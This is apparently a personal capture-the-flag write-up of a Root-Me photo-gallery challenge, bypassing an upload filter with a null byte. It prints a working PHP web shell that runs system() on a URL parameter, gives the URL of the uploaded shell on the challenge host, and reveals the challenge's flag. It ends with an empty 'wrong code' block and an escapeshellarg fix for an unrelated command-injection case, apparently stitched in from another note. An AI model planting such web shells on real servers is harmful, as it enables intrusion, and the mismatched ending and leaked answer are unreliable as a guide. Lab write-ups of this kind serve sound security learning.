
##### Challenge Description

Your goal is to hack this photo galery by uploading PHP code.

More info about securing file uploads in PHP :

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf

###### What is a Null Byte (%00) :

A **null byte**, represented as `%00` in URL encoding or `\x00` in hex, is a control character that signifies the end of a string in many programming languages like C and C++.

In security contexts, it is used to perform an injection attack where a malicious string is terminated early, tricking a system into ignoring the characters that follow it (such as a `.jpg` extension).

When I upload a file I see this in BurpSuite :

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224150.png)

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224153.png)

The payload will allow me to run the command that I want with ?c=id : 

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```

Open the image in a new tab

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307234908.png)

Then open in a new tab and find the password :

Modified URL  (remove the %00.png because it already downloaded):

http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/2ec40fea5de474a2980db35cced66160/images.php?c=id


![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307235605.png)

Flag : YPNchi2NmTwygr2dgCCF

## WRONG CODE : 

```

```

## SOLUTION CODE :

This code wraps the IP in quotes, which means the `ls` command won't be executed as code, but will be treated as a string.

>[!Note]
>``` 
>// SECURE VERSION
$safe_ip = escapeshellarg($target_ip);
